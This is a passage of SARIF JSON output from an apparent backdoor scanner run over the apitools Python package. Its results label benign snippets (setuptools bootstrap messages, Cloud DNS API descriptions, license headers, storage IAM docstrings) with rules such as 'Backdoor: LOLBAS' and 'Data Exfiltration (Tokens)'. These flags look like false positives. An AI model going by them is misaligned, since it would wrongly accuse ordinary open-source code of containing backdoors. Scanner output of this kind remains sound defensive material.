              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/ez_setup.py"
                },
                "region": {
                  "startLine": 131,
                  "startColumn": 4,
                  "endLine": 131,
                  "endColumn": 12,
                  "snippet": {
                    "text": "            if delay:\n                log.warn(\"\"\"\n---------------------------------------------------------------------------\nThis script requires setuptools version %s to run (even to display\nhelp).  I will attempt to download it for you (from\n%s), but\nyou may need to enable firewall access for this script first.\n",
                    "rendered": {
                      "text": "            if delay:\n                log.warn(\"\"\"\n---------------------------------------------------------------------------\nThis script requires setuptools version %s to run (even to display\nhelp).  I will attempt to download it for you (from\n%s), but\nyou may need to enable firewall access for this script first.\n",
                      "markdown": "`            if delay:\n                log.warn(\"\"\"\n---------------------------------------------------------------------------\nThis script requires setuptools version %s to run (even to display\nhelp).  I will attempt to download it for you (from\n%s), but\nyou may need to enable firewall access for this script first.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/ez_setup.py"
                },
                "region": {
                  "startLine": 98,
                  "startColumn": 42,
                  "endLine": 98,
                  "endColumn": 50,
                  "snippet": {
                    "text": "        if was_imported:\n            print >>sys.stderr, (\n            \"The required version of setuptools (>=%s) is not available, and\\n\"\n            \"can't be installed while this script is running. Please install\\n\"\n            \" a more recent version first, using 'easy_install -U setuptools'.\"\n            \"\\n\\n(Currently using %r)\"\n            ) % (version, e.args[0])\n",
                    "rendered": {
                      "text": "        if was_imported:\n            print >>sys.stderr, (\n            \"The required version of setuptools (>=%s) is not available, and\\n\"\n            \"can't be installed while this script is running. Please install\\n\"\n            \" a more recent version first, using 'easy_install -U setuptools'.\"\n            \"\\n\\n(Currently using %r)\"\n            ) % (version, e.args[0])\n",
                      "markdown": "`        if was_imported:\n            print >>sys.stderr, (\n            \"The required version of setuptools (>=%s) is not available, and\\n\"\n            \"can't be installed while this script is running. Please install\\n\"\n            \" a more recent version first, using 'easy_install -U setuptools'.\"\n            \"\\n\\n(Currently using %r)\"\n            ) % (version, e.args[0])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/ez_setup.py"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 30,
                  "endLine": 29,
                  "endColumn": 38,
                  "snippet": {
                    "text": "mirror, or use an alternate download directory, you can do so by supplying\nthe appropriate options to ``use_setuptools()``.\n\nThis file can also be run as a script to install or upgrade setuptools.\n\"\"\"\nimport sys\nDEFAULT_VERSION = \"0.6c11\"\n",
                    "rendered": {
                      "text": "mirror, or use an alternate download directory, you can do so by supplying\nthe appropriate options to ``use_setuptools()``.\n\nThis file can also be run as a script to install or upgrade setuptools.\n\"\"\"\nimport sys\nDEFAULT_VERSION = \"0.6c11\"\n",
                      "markdown": "`mirror, or use an alternate download directory, you can do so by supplying\nthe appropriate options to ``use_setuptools()``.\n\nThis file can also be run as a script to install or upgrade setuptools.\n\"\"\"\nimport sys\nDEFAULT_VERSION = \"0.6c11\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/ez_setup.py"
                },
                "region": {
                  "startLine": 20,
                  "startColumn": 55,
                  "endLine": 20,
                  "endColumn": 60,
                  "snippet": {
                    "text": "\"\"\"Bootstrap setuptools installation\n\nIf you want to use setuptools in your package's setup.py, just include this\nfile in the same directory with it, and add this to the top of your setup.py::\n\n    from ez_setup import use_setuptools\n    use_setuptools()\n",
                    "rendered": {
                      "text": "\"\"\"Bootstrap setuptools installation\n\nIf you want to use setuptools in your package's setup.py, just include this\nfile in the same directory with it, and add this to the top of your setup.py::\n\n    from ez_setup import use_setuptools\n    use_setuptools()\n",
                      "markdown": "`\"\"\"Bootstrap setuptools installation\n\nIf you want to use setuptools in your package's setup.py, just include this\nfile in the same directory with it, and add this to the top of your setup.py::\n\n    from ez_setup import use_setuptools\n    use_setuptools()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1.json"
                },
                "region": {
                  "startLine": 351,
                  "startColumn": 31,
                  "endLine": 351,
                  "endColumn": 39,
                  "snippet": {
                    "text": "     \"id\": \"dns.changes.create\",\n     \"path\": \"{project}/managedZones/{managedZone}/changes\",\n     \"httpMethod\": \"POST\",\n     \"description\": \"Atomically update the ResourceRecordSet collection.\",\n     \"parameters\": {\n      \"managedZone\": {\n       \"type\": \"string\",\n",
                    "rendered": {
                      "text": "     \"id\": \"dns.changes.create\",\n     \"path\": \"{project}/managedZones/{managedZone}/changes\",\n     \"httpMethod\": \"POST\",\n     \"description\": \"Atomically update the ResourceRecordSet collection.\",\n     \"parameters\": {\n      \"managedZone\": {\n       \"type\": \"string\",\n",
                      "markdown": "`     \"id\": \"dns.changes.create\",\n     \"path\": \"{project}/managedZones/{managedZone}/changes\",\n     \"httpMethod\": \"POST\",\n     \"description\": \"Atomically update the ResourceRecordSet collection.\",\n     \"parameters\": {\n      \"managedZone\": {\n       \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1.json"
                },
                "region": {
                  "startLine": 332,
                  "startColumn": 322,
                  "endLine": 332,
                  "endColumn": 326,
                  "snippet": {
                    "text": "he presence of this field indicates that there exist more results following your last page of results in pagination order. To fetch them, make another list request using this value as your pagination token.\\n\\nIn this way you can retrieve the complete contents of even very large collections one page at a time. However, if the contents of the collection change between the first and last paginated list request, the set of all elements returned will be an inconsistent view of the collection. There is no way to retrieve a consistent snapshot of a collection larger than the maximum page size.\"\n    },\n ",
                    "rendered": {
                      "text": "he presence of this field indicates that there exist more results following your last page of results in pagination order. To fetch them, make another list request using this value as your pagination token.\\n\\nIn this way you can retrieve the complete contents of even very large collections one page at a time. However, if the contents of the collection change between the first and last paginated list request, the set of all elements returned will be an inconsistent view of the collection. There is no way to retrieve a consistent snapshot of a collection larger than the maximum page size.\"\n    },\n ",
                      "markdown": "`he presence of this field indicates that there exist more results following your last page of results in pagination order. To fetch them, make another list request using this value as your pagination token.\\n\\nIn this way you can retrieve the complete contents of even very large collections one page at a time. However, if the contents of the collection change between the first and last paginated list request, the set of all elements returned will be an inconsistent view of the collection. There is no way to retrieve a consistent snapshot of a collection larger than the maximum page size.\"\n    },\n `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1.json"
                },
                "region": {
                  "startLine": 218,
                  "startColumn": 316,
                  "endLine": 218,
                  "endColumn": 320,
                  "snippet": {
                    "text": "n\": \"The presence of this field indicates that there exist more results following your last page of results in pagination order. To fetch them, make another list request using this value as your page token.\\n\\nIn this way you can retrieve the complete contents of even very large collections one page at a time. However, if the contents of the collection change between the first and last paginated list request, the set of all elements returned will be an inconsistent view of the collection. There is no way to retrieve a consistent snapshot of a collection larger than the maximum page size.\"\n    }\n  ",
                    "rendered": {
                      "text": "n\": \"The presence of this field indicates that there exist more results following your last page of results in pagination order. To fetch them, make another list request using this value as your page token.\\n\\nIn this way you can retrieve the complete contents of even very large collections one page at a time. However, if the contents of the collection change between the first and last paginated list request, the set of all elements returned will be an inconsistent view of the collection. There is no way to retrieve a consistent snapshot of a collection larger than the maximum page size.\"\n    }\n  ",
                      "markdown": "`n\": \"The presence of this field indicates that there exist more results following your last page of results in pagination order. To fetch them, make another list request using this value as your page token.\\n\\nIn this way you can retrieve the complete contents of even very large collections one page at a time. However, if the contents of the collection change between the first and last paginated list request, the set of all elements returned will be an inconsistent view of the collection. There is no way to retrieve a consistent snapshot of a collection larger than the maximum page size.\"\n    }\n  `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1.json"
                },
                "region": {
                  "startLine": 167,
                  "startColumn": 40,
                  "endLine": 167,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    },\n    \"description\": {\n     \"type\": \"string\",\n     \"description\": \"A mutable string of at most 1024 characters associated with this resource for the user's convenience. Has no effect on the managed zone's function.\"\n    },\n    \"dnsName\": {\n     \"type\": \"string\",\n",
                    "rendered": {
                      "text": "    },\n    \"description\": {\n     \"type\": \"string\",\n     \"description\": \"A mutable string of at most 1024 characters associated with this resource for the user's convenience. Has no effect on the managed zone's function.\"\n    },\n    \"dnsName\": {\n     \"type\": \"string\",\n",
                      "markdown": "`    },\n    \"description\": {\n     \"type\": \"string\",\n     \"description\": \"A mutable string of at most 1024 characters associated with this resource for the user's convenience. Has no effect on the managed zone's function.\"\n    },\n    \"dnsName\": {\n     \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1.json"
                },
                "region": {
                  "startLine": 152,
                  "startColumn": 322,
                  "endLine": 152,
                  "endColumn": 326,
                  "snippet": {
                    "text": "he presence of this field indicates that there exist more results following your last page of results in pagination order. To fetch them, make another list request using this value as your pagination token.\\n\\nIn this way you can retrieve the complete contents of even very large collections one page at a time. However, if the contents of the collection change between the first and last paginated list request, the set of all elements returned will be an inconsistent view of the collection. There is no way to retrieve a \\\"snapshot\\\" of collections larger than the maximum page size.\"\n    }\n   }\n  },\n",
                    "rendered": {
                      "text": "he presence of this field indicates that there exist more results following your last page of results in pagination order. To fetch them, make another list request using this value as your pagination token.\\n\\nIn this way you can retrieve the complete contents of even very large collections one page at a time. However, if the contents of the collection change between the first and last paginated list request, the set of all elements returned will be an inconsistent view of the collection. There is no way to retrieve a \\\"snapshot\\\" of collections larger than the maximum page size.\"\n    }\n   }\n  },\n",
                      "markdown": "`he presence of this field indicates that there exist more results following your last page of results in pagination order. To fetch them, make another list request using this value as your pagination token.\\n\\nIn this way you can retrieve the complete contents of even very large collections one page at a time. However, if the contents of the collection change between the first and last paginated list request, the set of all elements returned will be an inconsistent view of the collection. There is no way to retrieve a \\\"snapshot\\\" of collections larger than the maximum page size.\"\n    }\n   }\n  },\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1.json"
                },
                "region": {
                  "startLine": 90,
                  "startColumn": 28,
                  "endLine": 90,
                  "endColumn": 36,
                  "snippet": {
                    "text": "  \"Change\": {\n   \"id\": \"Change\",\n   \"type\": \"object\",\n   \"description\": \"An atomic update to a collection of ResourceRecordSets.\",\n   \"properties\": {\n    \"additions\": {\n     \"type\": \"array\",\n",
                    "rendered": {
                      "text": "  \"Change\": {\n   \"id\": \"Change\",\n   \"type\": \"object\",\n   \"description\": \"An atomic update to a collection of ResourceRecordSets.\",\n   \"properties\": {\n    \"additions\": {\n     \"type\": \"array\",\n",
                      "markdown": "`  \"Change\": {\n   \"id\": \"Change\",\n   \"type\": \"object\",\n   \"description\": \"An atomic update to a collection of ResourceRecordSets.\",\n   \"properties\": {\n    \"additions\": {\n     \"type\": \"array\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1.json"
                },
                "region": {
                  "startLine": 225,
                  "startColumn": 55,
                  "endLine": 225,
                  "endColumn": 60,
                  "snippet": {
                    "text": "  \"Project\": {\n   \"id\": \"Project\",\n   \"type\": \"object\",\n   \"description\": \"A project resource. The project is a top level container for resources including Cloud DNS ManagedZones. Projects can be created only in the APIs console.\",\n   \"properties\": {\n    \"id\": {\n     \"type\": \"string\",\n",
                    "rendered": {
                      "text": "  \"Project\": {\n   \"id\": \"Project\",\n   \"type\": \"object\",\n   \"description\": \"A project resource. The project is a top level container for resources including Cloud DNS ManagedZones. Projects can be created only in the APIs console.\",\n   \"properties\": {\n    \"id\": {\n     \"type\": \"string\",\n",
                      "markdown": "`  \"Project\": {\n   \"id\": \"Project\",\n   \"type\": \"object\",\n   \"description\": \"A project resource. The project is a top level container for resources including Cloud DNS ManagedZones. Projects can be created only in the APIs console.\",\n   \"properties\": {\n    \"id\": {\n     \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1.json"
                },
                "region": {
                  "startLine": 163,
                  "startColumn": 24,
                  "endLine": 163,
                  "endColumn": 30,
                  "snippet": {
                    "text": "   \"properties\": {\n    \"creationTime\": {\n     \"type\": \"string\",\n     \"description\": \"The time that this resource was created on the server. This is in RFC3339 text format. Output only.\"\n    },\n    \"description\": {\n     \"type\": \"string\",\n",
                    "rendered": {
                      "text": "   \"properties\": {\n    \"creationTime\": {\n     \"type\": \"string\",\n     \"description\": \"The time that this resource was created on the server. This is in RFC3339 text format. Output only.\"\n    },\n    \"description\": {\n     \"type\": \"string\",\n",
                      "markdown": "`   \"properties\": {\n    \"creationTime\": {\n     \"type\": \"string\",\n     \"description\": \"The time that this resource was created on the server. This is in RFC3339 text format. Output only.\"\n    },\n    \"description\": {\n     \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1.json"
                },
                "region": {
                  "startLine": 117,
                  "startColumn": 24,
                  "endLine": 117,
                  "endColumn": 30,
                  "snippet": {
                    "text": "    },\n    \"startTime\": {\n     \"type\": \"string\",\n     \"description\": \"The time that this operation was started by the server. This is in RFC3339 text format.\"\n    },\n    \"status\": {\n     \"type\": \"string\",\n",
                    "rendered": {
                      "text": "    },\n    \"startTime\": {\n     \"type\": \"string\",\n     \"description\": \"The time that this operation was started by the server. This is in RFC3339 text format.\"\n    },\n    \"status\": {\n     \"type\": \"string\",\n",
                      "markdown": "`    },\n    \"startTime\": {\n     \"type\": \"string\",\n     \"description\": \"The time that this operation was started by the server. This is in RFC3339 text format.\"\n    },\n    \"status\": {\n     \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/dns_v1.json"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 4,
                  "endLine": 46,
                  "endColumn": 14,
                  "snippet": {
                    "text": "   \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n   \"location\": \"query\"\n  },\n  \"oauth_token\": {\n   \"type\": \"string\",\n   \"description\": \"OAuth 2.0 token for the current user.\",\n   \"location\": \"query\"\n",
                    "rendered": {
                      "text": "   \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n   \"location\": \"query\"\n  },\n  \"oauth_token\": {\n   \"type\": \"string\",\n   \"description\": \"OAuth 2.0 token for the current user.\",\n   \"location\": \"query\"\n",
                      "markdown": "`   \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n   \"location\": \"query\"\n  },\n  \"oauth_token\": {\n   \"type\": \"string\",\n   \"description\": \"OAuth 2.0 token for the current user.\",\n   \"location\": \"query\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/__init__.py"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 38,
                  "endLine": 6,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/dns_sample/gen_dns_client_test.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 2215,
                  "startColumn": 32,
                  "endLine": 2215,
                  "endColumn": 40,
                  "snippet": {
                    "text": "      storage.objects.getIamPolicy - Read object IAM policy.   -\n      storage.objects.create - Create object.   - storage.objects.list - List\n      objects.   - storage.objects.setIamPolicy - Update object IAM policy.\n      - storage.objects.update - Update object metadata.\n  \"\"\"\n\n  kind = _messages.StringField(1, default='storage#testIamPermissionsResponse')\n",
                    "rendered": {
                      "text": "      storage.objects.getIamPolicy - Read object IAM policy.   -\n      storage.objects.create - Create object.   - storage.objects.list - List\n      objects.   - storage.objects.setIamPolicy - Update object IAM policy.\n      - storage.objects.update - Update object metadata.\n  \"\"\"\n\n  kind = _messages.StringField(1, default='storage#testIamPermissionsResponse')\n",
                      "markdown": "`      storage.objects.getIamPolicy - Read object IAM policy.   -\n      storage.objects.create - Create object.   - storage.objects.list - List\n      objects.   - storage.objects.setIamPolicy - Update object IAM policy.\n      - storage.objects.update - Update object metadata.\n  \"\"\"\n\n  kind = _messages.StringField(1, default='storage#testIamPermissionsResponse')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 2214,
                  "startColumn": 49,
                  "endLine": 2214,
                  "endColumn": 57,
                  "snippet": {
                    "text": "      storage.objects.get - Read object data and metadata.   -\n      storage.objects.getIamPolicy - Read object IAM policy.   -\n      storage.objects.create - Create object.   - storage.objects.list - List\n      objects.   - storage.objects.setIamPolicy - Update object IAM policy.\n      - storage.objects.update - Update object metadata.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "      storage.objects.get - Read object data and metadata.   -\n      storage.objects.getIamPolicy - Read object IAM policy.   -\n      storage.objects.create - Create object.   - storage.objects.list - List\n      objects.   - storage.objects.setIamPolicy - Update object IAM policy.\n      - storage.objects.update - Update object metadata.\n  \"\"\"\n\n",
                      "markdown": "`      storage.objects.get - Read object data and metadata.   -\n      storage.objects.getIamPolicy - Read object IAM policy.   -\n      storage.objects.create - Create object.   - storage.objects.list - List\n      objects.   - storage.objects.setIamPolicy - Update object IAM policy.\n      - storage.objects.update - Update object metadata.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 2209,
                  "startColumn": 60,
                  "endLine": 2209,
                  "endColumn": 68,
                  "snippet": {
                    "text": "      bucket metadata.   - storage.buckets.getIamPolicy - Read bucket IAM\n      policy.   - storage.buckets.create - Create bucket.   -\n      storage.buckets.list - List buckets.   - storage.buckets.setIamPolicy -\n      Update bucket IAM policy.   - storage.buckets.update - Update bucket\n      metadata.   - storage.objects.delete - Delete object.   -\n      storage.objects.get - Read object data and metadata.   -\n      storage.objects.getIamPolicy - Read object IAM policy.   -\n",
                    "rendered": {
                      "text": "      bucket metadata.   - storage.buckets.getIamPolicy - Read bucket IAM\n      policy.   - storage.buckets.create - Create bucket.   -\n      storage.buckets.list - List buckets.   - storage.buckets.setIamPolicy -\n      Update bucket IAM policy.   - storage.buckets.update - Update bucket\n      metadata.   - storage.objects.delete - Delete object.   -\n      storage.objects.get - Read object data and metadata.   -\n      storage.objects.getIamPolicy - Read object IAM policy.   -\n",
                      "markdown": "`      bucket metadata.   - storage.buckets.getIamPolicy - Read bucket IAM\n      policy.   - storage.buckets.create - Create bucket.   -\n      storage.buckets.list - List buckets.   - storage.buckets.setIamPolicy -\n      Update bucket IAM policy.   - storage.buckets.update - Update bucket\n      metadata.   - storage.objects.delete - Delete object.   -\n      storage.objects.get - Read object data and metadata.   -\n      storage.objects.getIamPolicy - Read object IAM policy.   -\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 2209,
                  "startColumn": 5,
                  "endLine": 2209,
                  "endColumn": 13,
                  "snippet": {
                    "text": "      bucket metadata.   - storage.buckets.getIamPolicy - Read bucket IAM\n      policy.   - storage.buckets.create - Create bucket.   -\n      storage.buckets.list - List buckets.   - storage.buckets.setIamPolicy -\n      Update bucket IAM policy.   - storage.buckets.update - Update bucket\n      metadata.   - storage.objects.delete - Delete object.   -\n      storage.objects.get - Read object data and metadata.   -\n      storage.objects.getIamPolicy - Read object IAM policy.   -\n",
                    "rendered": {
                      "text": "      bucket metadata.   - storage.buckets.getIamPolicy - Read bucket IAM\n      policy.   - storage.buckets.create - Create bucket.   -\n      storage.buckets.list - List buckets.   - storage.buckets.setIamPolicy -\n      Update bucket IAM policy.   - storage.buckets.update - Update bucket\n      metadata.   - storage.objects.delete - Delete object.   -\n      storage.objects.get - Read object data and metadata.   -\n      storage.objects.getIamPolicy - Read object IAM policy.   -\n",
                      "markdown": "`      bucket metadata.   - storage.buckets.getIamPolicy - Read bucket IAM\n      policy.   - storage.buckets.create - Create bucket.   -\n      storage.buckets.list - List buckets.   - storage.buckets.setIamPolicy -\n      Update bucket IAM policy.   - storage.buckets.update - Update bucket\n      metadata.   - storage.objects.delete - Delete object.   -\n      storage.objects.get - Read object data and metadata.   -\n      storage.objects.getIamPolicy - Read object IAM policy.   -\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 767,
                  "startColumn": 7,
                  "endLine": 767,
                  "endColumn": 16,
                  "snippet": {
